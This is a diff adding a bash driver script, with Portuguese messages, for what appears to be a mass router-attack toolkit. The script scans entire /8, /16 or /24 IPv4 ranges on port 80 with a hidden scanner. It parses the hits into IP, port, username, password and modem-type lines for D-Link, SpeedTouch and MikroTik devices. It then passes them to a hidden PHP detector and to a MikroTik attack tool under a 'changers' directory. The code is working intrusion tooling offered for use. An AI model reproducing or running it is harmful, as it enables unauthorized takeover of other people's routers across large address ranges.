@@ -1,0 +1,237 @@
+#!/bin/bash
+
+ulimit -n 31337
+ulimit -i unlimited
+ulimit -e unlimited
+ulimit -l unlimited
+ulimit -q unlimited
+ulimit -s unlimited
+ulimit -u unlimited
+
+if [ -f .fscan ]; then
+	ldd .fscan | grep 'not a dynamic executable' 1>/dev/null 2>/dev/null
+	if [ $? == 0 ]; then
+		echo "[!] fscan needs to be recompiled"
+		echo -n "[?] can I try to recompile? [Y/n] "
+		read RFSCAN
+		if [ -z "${RFSCAN}" ] || [ "${RFSCAN}" == y ] || [ "${RFSCAN}" == Y ]; then
+			echo -n "[!] recompiling... "
+			make -C src/ 1>/dev/null 2>/dev/null
+			echo "[OK]"
+			exit 0
+		else
+			echo "[!] so, go fuck yourself!"
+			exit 0
+		fi
+		exit 0
+	fi
+else
+	echo -n "[!] fscan not found, compiling... "
+	make -C src/ 1>/dev/null 2>/dev/null
+	echo "[OK]"
+	exit 0
+fi
+
+if ! which php 1>/dev/null 2>/dev/null; then
+	echo "[!] php not found, exiting..."
+	exit 0
+fi
+
+if ! which curl 1>/dev/null 2>/dev/null; then
+	echo "[!] curl not found, exiting..."
+	exit 0
+fi
+
+perl -e 'use Net::Telnet;' 1>/dev/null 2>/dev/null
+if [ $? -gt 0 ]; then
+	echo "[!] perl module Net::Telnet not found"
+	echo -n "[?] can I try to install ? [Y/n] "
+	read LNTEL
+	if [ -z "${LNTEL}" ] || [ "${LNTEL}" == y ] || [ "${LNTEL}" == Y ]; then
+		echo -n "[!] installing... "
+		cd src ; tar xvzf Net-Telnet-3.03.tar.gz 1>/dev/null 2>/dev/null ; cd Net-Telnet-3.03 ; perl Makefile.PL 1>/dev/null 2>/dev/null && make 1>/dev/null 2>/dev/null && make install 1>/dev/null 2>/dev/null ; cd .. ; rm -rf Net-Telnet-3.03 ; cd ..
+		echo "[OK]"
+		exit 0
+	fi
+	exit 0
+fi
+
+ldd changers/mikrotik/api | grep 'not found' 1>/dev/null 2>/dev/null
+if [ $? == 0 ]; then
+	echo "[!] Mikrotik librouteros nao encontrada"
+	echo -n "[?] voce deseja compila-la ? [Y/n] "
+	read LROS
+	if [ -z "${LROS}" ] || [ "${LROS}" == y ] || [ "${LROS}" == Y ]; then
+		echo -n "[!] compilando... "
+		cd changers/mikrotik/.librouteros-1.1.2 && make clean 1>/dev/null 2>/dev/null && make distclean 1>/dev/null 2>/dev/null; ./configure 1>/dev/null 2>/dev/null && make 1>/dev/null 2>/dev/null && rm -rf /usr/lib/librouteros.so.0.2.2 /usr/lib/librouteros.so.0 ../api && cp src/.libs/librouteros.so.0.2.2 /usr/lib && cp src/.libs/ros ../api && make clean 1>/dev/null 2>/dev/null ; make distclean 1>/dev/null 2>/dev/null; ln -s /usr/lib/librouteros.so.0.2.2 /usr/lib/librouteros.so.0 && cd ../../..
+		echo "[OK]"
+	fi
+	exit 0
+fi
+
+if [ $# -lt 2 ]; then
+	echo "usage: ${0} [-a <a class> | -b <b class> | -c <c class>]"
+	echo " -t <scan timeout>  (default: 3  )"
+	echo " -p <scan pthreads> (default: 200)"
+	exit 0
+fi
+
+: ${A_FLAG:="0"}
+: ${B_FLAG:="0"}
+: ${C_FLAG:="0"}
+: ${T_FLAG:="0"}
+: ${P_FLAG:="0"}
+: ${MAXDETECTS:="50"}
+: ${ND:=0}
+
+while getopts "a:b:c:t:p:" OPTION
+do
+	case $OPTION in
+		a)
+			A_FLAG="1"
+			A_OPT="$OPTARG"
+			;;
+		b)
+			B_FLAG="1"
+			B_OPT="$OPTARG"
+			;;
+		c)
+			C_FLAG="1"
+			C_OPT="$OPTARG"
+			;;
+		t)
+			T_FLAG="1"
+			T_OPT="$OPTARG"
+			;;
+		p)
+			P_FLAG="1"
+			P_OPT="$OPTARG"
+			;;
+		?)
+			exit 1
+			;;
+	esac
+done
+
+function detect {
+	DPROGRESS=`wc -l logs/${1}.parsed.log | awk '{ print $1 }'`
+	for i in `cat logs/${1}.parsed.log`; do
+	        ip=`echo $i | cut -d ':' -f1`
+	        port=`echo $i | cut -d ':' -f2`
+	        user=`echo $i | cut -d ':' -f3`
+	        pass=`echo $i | cut -d ':' -f4`
+	        php .detector -h "$ip" -u "$user" -p "$pass" &
+	        if (( $(($((++ND)) % $MAXDETECTS)) == 0 )) ; then
+	                wait
+	        fi
+	        DPROGRESS=$(( $DPROGRESS - 1 ))
+	done
+	wait $!
+	sleep 5
+	rm -rf logs/${1}.parsed.log
+}
+
+function parse {
+	rm -rf logs/${1}.parsed.log logs/${1}.log.tmp 1>/dev/null 2>/dev/null
+	grep -i 'Mikrotik RouterOS' logs/${1}.log | awk '{ print $1 }' > logs/${1}.mk.log
+	for cut in `cat logs/${1}.log | awk '{ print $1":"$2":"$4":"$5 }'`; do
+		    ip=`echo $cut | cut -d ':' -f1`
+	        port=`echo $cut | cut -d ':' -f2`
+	        user=`echo $cut | cut -d ':' -f3`
+	        pass=`echo $cut | cut -d ':' -f4`
+	        modem=`echo $cut | cut -d ':' -f5`
+
+			if [ "${user}" == "not" ] && [ "${pass}" == "found" ] && [ "${modem}" == "micro_httpd" ]; then
+				echo "$ip:$port:ALLOWED:DLINK:DL" >> logs/${1}.parsed.log
+				continue
+			fi
+
+			if [ "${port}" == "80" ] && [ "${modem}" == "Speed Touch" ]; then
+				echo "${ip}:${port}:ALLOWED:SPEEDTOUCH:SP" >> logs/${1}.parsed.log
+				continue
+			fi
+
+		    if [ ${user} ] && [ ${pass} ] && [ ${modem} ]; then
+				if [ ${user} == "not" ] && [ ${pass} == "found" ]; then
+					continue
+				else
+					echo "$ip:$port:$user:$pass:$modem" >> logs/${1}.parsed.log
+					continue
+				fi
+	        fi
+	done
+
+	if [ -f "logs/${1}.parsed.log" ]; then
+		sort -u logs/${1}.parsed.log -o logs/${1}.parsed.log
+		rm -rf logs/${1}.log logs/${1}.log.tmp
+	fi
+}
+
+if [ ${T_FLAG} == 0 ]; then
+	T_OPT="3"
+fi
+
+if [ ${P_FLAG} == 0 ]; then
+	P_OPT="200"
+fi
+
+if [ ${A_FLAG} == 1 ]; then
+	./.fscan --ports 80 --hosts ${A_OPT}.0.0.0-${A_OPT}.255.255.255 --logfile logs/${A_OPT}.log --timeout ${T_OPT} --threads ${P_OPT}
+	if [ -f "logs/${A_OPT}.log" ]; then
+		parse "${A_OPT}"
+		sleep 1
+		detect "${A_OPT}"
+	else
+		echo "[*] nenhum modem encontrado"
+	fi
+    if [ -f "logs/${A_OPT}.mk.log" ] && [ `wc -l logs/${A_OPT}.mk.log | awk '{ print $1 }'` -gt 0 ]; then
+        ./mikrotik -i "logs/${A_OPT}.mk.log" -a -t 3 -p 100
+		wait $!
+		sleep 1
+        ./mikrotik -i "logs/${A_OPT}.mk.log" -s -t 3 -p 100
+		wait $!
+		sleep 1
+		rm -rf "logs/${A_OPT}.mk.log"
+    fi
+fi
+
+if [ ${B_FLAG} == 1 ]; then
+	./.fscan --ports 80 --hosts ${B_OPT}.0.0-${B_OPT}.255.255 --logfile logs/${B_OPT}.log --timeout ${T_OPT} --threads ${P_OPT}
+	if [ -f "logs/${B_OPT}.log" ]; then
+		parse "${B_OPT}"
+		sleep 1
+		detect "${B_OPT}"
+	else
+		echo "[*] nenhum modem encontrado"
+	fi
+	if [ -f "logs/${B_OPT}.mk.log" ] && [ `wc -l logs/${B_OPT}.mk.log | awk '{ print $1 }'` -gt 0 ]; then
+		./mikrotik -i "logs/${B_OPT}.mk.log" -a -t 3 -p 100
+		wait $!
+		sleep 1
+		./mikrotik -i "logs/${B_OPT}.mk.log" -s -t 3 -p 100
+		wait $!
+		sleep 1
+		rm -rf "logs/${B_OPT}.mk.log"
+	fi
+fi
+
+if [ ${C_FLAG} == 1 ]; then
+	./.fscan --ports 80 --hosts ${C_OPT}.0-${C_OPT}.255 --logfile logs/${C_OPT}.log --timeout ${T_OPT} --threads ${P_OPT}
+	if [ -f "logs/${C_OPT}.log" ]; then
+		parse "${C_OPT}"
+		sleep 1
+		detect "${C_OPT}"
+	else
+		echo "[*] nenhum modem encontrado"
+	fi
+    if [ -f "logs/${C_OPT}.mk.log" ] && [ `wc -l logs/${C_OPT}.mk.log | awk '{ print $1 }'` -gt 0 ]; then
+        ./mikrotik -i "logs/${C_OPT}.mk.log" -a -t 3 -p 100
+		wait $!
+		sleep 1
+        ./mikrotik -i "logs/${C_OPT}.mk.log" -s -t 3 -p 100
+		wait $!
+		sleep 1
+		rm -rf "logs/${C_OPT}.mk.log"
+    fi
+
+fi
